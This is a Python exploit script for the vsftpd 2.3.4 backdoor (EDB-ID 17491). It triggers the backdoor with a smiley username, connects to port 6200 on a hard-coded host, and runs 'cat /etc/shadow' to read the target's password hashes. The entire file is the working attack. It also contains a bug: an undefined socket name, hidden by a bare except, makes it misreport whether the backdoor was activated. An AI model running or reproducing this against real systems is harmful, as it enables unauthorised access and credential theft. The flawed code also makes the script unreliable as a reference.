#!/usr/bin/env python3.6
# vsftpd 2.3.4
# EDB-ID: 17491
#
# The exploit is activated on port 6200 by attempt to login with
# username ending with ":)" smiley. See CVE database for more
# information.
import socket
import time

class vsftpd_exploit:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def activate(self):
        try:
            vsftpd_connection = socket.socket(socket.AF_INET,
                socket.SOCK_STREAM)
            vsftpd_connection.connect((self.ip, self.port))
            vsftpd_connection.send(b'USER usr:)\n')
            time.sleep(2)
            vsftpd_connection.send(b'PASS somepass\n')
            time.sleep(2)
            resp = vsftpd_connection.recv(1024).decode('utf-8')
            print('Check received: {}'.format(resp))
            time.sleep(2)
            vsftpd_connection.send(b'QUIT\n')
            time.sleep(2)
            vsftpd_socket.close()
            print('okay')
        except:
            return 0
        return 1

    def remexec(self, cmd):
        try:
            vsftpd_connection = socket.socket(socket.AF_INET,
                socket.SOCK_STREAM)
            vsftpd_connection.connect((self.ip, 6200))
            command = str.encode('{}\n'.format(cmd))
            vsftpd_connection.send(command)
            resp = vsftpd_connection.recv(4096).decode('utf-8')
            vsftpd_connection.close()
            print(resp)
        except:
            return 0
        return 1

def main(ip, port):
    exploit = vsftpd_exploit(ip, port)
    result = exploit.activate()
    if result:
        print('vsftpd backdoor activated')
    else:
        print('vsftpd backdoor not activated')
    resp = exploit.remexec('cat /etc/shadow')
    print(resp)

if __name__ == '__main__':
    main('10.195.2.2', 21)

